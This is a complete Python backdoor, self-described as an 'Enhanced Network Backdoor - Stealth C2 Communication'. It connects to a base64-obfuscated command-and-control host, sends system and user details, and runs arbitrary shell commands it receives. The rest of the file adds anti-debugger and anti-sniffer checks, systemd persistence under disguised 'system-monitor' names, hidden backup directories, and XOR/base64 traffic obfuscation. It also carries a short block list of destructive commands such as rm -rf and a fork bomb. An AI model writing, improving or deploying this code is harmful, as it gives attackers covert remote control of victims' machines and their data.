#!/usr/bin/env python3
"""
Enhanced Network Backdoor - Stealth C2 Communication
Advanced persistence with multiple fallback mechanisms
"""

import base64
import socket
import subprocess
import time
import os
import sys
import random
import ssl
import json
import hashlib
import threading
from pathlib import Path

class AdvancedStealthCommunicator:
    def __init__(self):
        # Obfuscated C2 configuration
        self.C2_CONFIGS = [
            {
                'host': base64.b64decode(b"MTkyLjE2OC4xLjE2Nw==").decode(),
                'port': int(base64.b64decode(b"NDQ0NQ==").decode()),
                'active': True
            },
            # Fallback C2 servers can be added here
        ]
        
        self.current_c2 = 0
        self.retry_count = 0
        self.max_retries = 50
        self.beacon_interval = 30
        self.stealth_mode = True
        
        # Stealth directories
        self.install_dir = "/usr/lib/systemd/system-monitor"
        self.backup_dir = "/etc/.system-monitor"
        
        self.setup_environment()
        
    def setup_environment(self):
        """Ensure stealth environment exists"""
        Path(self.install_dir).mkdir(parents=True, exist_ok=True)
        Path(self.backup_dir).mkdir(parents=True, exist_ok=True)
        
    def security_checks(self):
        """Anti-analysis and security checks"""
        # Check for debuggers
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            sys.exit(0)
            
        # Check for common analysis tools
        analysis_processes = ['strace', 'ltrace', 'gdb', 'wireshark', 'tcpdump']
        try:
            for proc in analysis_processes:
                result = subprocess.run(['pgrep', '-x', proc], 
                                      capture_output=True, text=True)
                if result.stdout.strip():
                    time.sleep(random.randint(60, 300))
                    break
        except:
            pass
            
    def get_system_info(self):
        """Collect comprehensive system information"""
        try:
            # Basic system info
            hostname = os.uname().nodename
            arch = os.uname().machine
            kernel = os.uname().release
            user = os.getenv('USER', 'unknown')
            
            # Network information
            try:
                ip_output = subprocess.run(['hostname', '-I'], 
                                         capture_output=True, text=True)
                ip_address = ip_output.stdout.strip()
            except:
                ip_address = "unknown"
                
            # Process count
            try:
                ps_output = subprocess.run(['ps', 'aux'], 
                                         capture_output=True, text=True)
                process_count = len(ps_output.stdout.splitlines()) - 1
            except:
                process_count = 0
                
            return {
                'hostname': hostname,
                'architecture': arch,
                'kernel': kernel,
                'user': user,
                'ip_address': ip_address,
                'process_count': process_count,
                'timestamp': time.time(),
                'pid': os.getpid()
            }
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    def advanced_obfuscate(self, data):
        """Advanced data obfuscation"""
        if isinstance(data, dict):
            data = json.dumps(data)
        
        # Multiple encoding layers
        encoded = base64.b64encode(data.encode()).decode()
        # Add simple XOR for additional obfuscation
        xor_key = 42
        xored = ''.join(chr(ord(c) ^ xor_key) for c in encoded)
        return base64.b64encode(xored.encode()).decode()
    
    def advanced_deobfuscate(self, data):
        """Deobfuscate received data"""
        try:
            # Reverse the obfuscation layers
            decoded = base64.b64decode(data).decode()
            xor_key = 42
            xored = ''.join(chr(ord(c) ^ xor_key) for c in decoded)
            return base64.b64decode(xored).decode()
        except:
            return data
    
    def create_stealth_connection(self):
        """Create stealthy connection to C2"""
        config = self.C2_CONFIGS[self.current_c2]
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(25)
            
            # Enable keepalive for persistent connections
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # Attempt SSL/TLS wrapping
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=config['host'])
            except Exception as e:
                # Fallback to plain socket
                pass
            
            sock.connect((config['host'], config['port']))
            self.retry_count = 0
            return sock
            
        except Exception as e:
            return None
    
    def execute_stealth_command(self, command):
        """Execute commands with safety checks"""
        if not command or command.strip() in ['exit', 'quit', 'shutdown']:
            return "Command not permitted"
        
        # Enhanced command filtering
        blocked_patterns = [
            'rm -rf', 'mkfs', 'dd if=', ':(){:|:&};:', 'chmod 000',
            '> /dev/sda', 'mv /bin/sh /bin/sh.bak'
        ]
        
        if any(pattern in command for pattern in blocked_patterns):
            return "Blocked: Dangerous command"
        
        try:
            # Execute with timeout and resource limits
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=45,
                executable='/bin/bash'
            )
            
            output = result.stdout + result.stderr
            return output.strip() or "Command executed (no output)"
            
        except subprocess.TimeoutExpired:
            return "Error: Command timeout"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def ensure_persistence(self):
        """Ensure malware persistence across reboots"""
        try:
            # Check if systemd service is running
            result = subprocess.run(
                ['systemctl', 'is-active', 'system-health-monitor.service'],
                capture_output=True, text=True
            )
            
            if result.returncode != 0:
                # Service not running, attempt to start
                subprocess.run(['systemctl', 'start', 'system-health-monitor.service'],
                             capture_output=True)
                
            # Verify backup copies exist
            backup_files = ['network_monitor.py', 'system_monitor.py']
            for file in backup_files:
                src = os.path.join(self.install_dir, file)
                dst = os.path.join(self.backup_dir, file)
                if os.path.exists(src) and not os.path.exists(dst):
                    subprocess.run(['cp', src, dst], capture_output=True)
                    
        except Exception as e:
            # Silent failure for persistence checks
            pass
    
    def send_beacon(self, sock):
        """Send beacon to C2 server"""
        try:
            system_info = self.get_system_info()
            beacon_data = {
                'type': 'beacon',
                'system': system_info,
                'version': '2.0',
                'status': 'active',
                'timestamp': time.time()
            }
            
            obfuscated_beacon = self.advanced_obfuscate(beacon_data)
            sock.send(obfuscated_beacon.encode() + b'\n')
            return True
            
        except Exception as e:
            return False
    
    def handle_command(self, sock, command):
        """Handle incoming C2 commands"""
        try:
            if command == 'ping':
                sock.send(b'pong')
                
            elif command.startswith('cmd:'):
                cmd = command[4:]
                result = self.execute_stealth_command(cmd)
                response = self.advanced_obfuscate(result)
                sock.send(response.encode())
                
            elif command == 'info':
                info = self.get_system_info()
                response = self.advanced_obfuscate(info)
                sock.send(response.encode())
                
            elif command == 'update':
                # Placeholder for update functionality
                sock.send(b'update_not_implemented')
                
            elif command == 'persistence_check':
                self.ensure_persistence()
                sock.send(b'persistence_verified')
                
            else:
                sock.send(b'unknown_command')
                
        except Exception as e:
            error_response = self.advanced_obfuscate(f"Command error: {str(e)}")
            sock.send(error_response.encode())
    
    def communication_loop(self):
        """Main C2 communication loop"""
        self.security_checks()
        
        while self.retry_count < self.max_retries:
            # Ensure persistence on each iteration
            self.ensure_persistence()
            
            sock = self.create_stealth_connection()
            if not sock:
                # Exponential backoff with jitter
                sleep_time = min(300, (2 ** min(self.retry_count, 8)) + random.randint(1, 15))
                time.sleep(sleep_time)
                self.retry_count += 1
                
                # Rotate C2 servers
                self.current_c2 = (self.current_c2 + 1) % len(self.C2_CONFIGS)
                continue
            
            try:
                # Initial beacon
                if not self.send_beacon(sock):
                    continue
                
                # Command loop
                while True:
                    try:
                        data = sock.recv(8192)
                        if not data:
                            break
                            
                        # Handle multiple commands in single receive
                        commands = data.decode().strip().split('\n')
                        for cmd_data in commands:
                            if cmd_data:
                                command = self.advanced_deobfuscate(cmd_data)
                                self.handle_command(sock, command)
                                
                    except socket.timeout:
                        # Periodic beacon
                        self.send_beacon(sock)
                        continue
                    except Exception as e:
                        break
                        
            except Exception as e:
                # Silent error handling
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass
            
            # Short delay before reconnection
            time.sleep(self.beacon_interval)
    
    def run(self):
        """Main execution with advanced forking"""
        # Double fork to daemonize properly
        try:
            pid = os.fork()
            if pid > 0:
                return
        except OSError as e:
            sys.exit(1)
            
        os.setsid()
        
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
            
        # Start communication in daemon
        self.communication_loop()

def main():
    communicator = AdvancedStealthCommunicator()
    communicator.run()

if __name__ == "__main__":
    main()
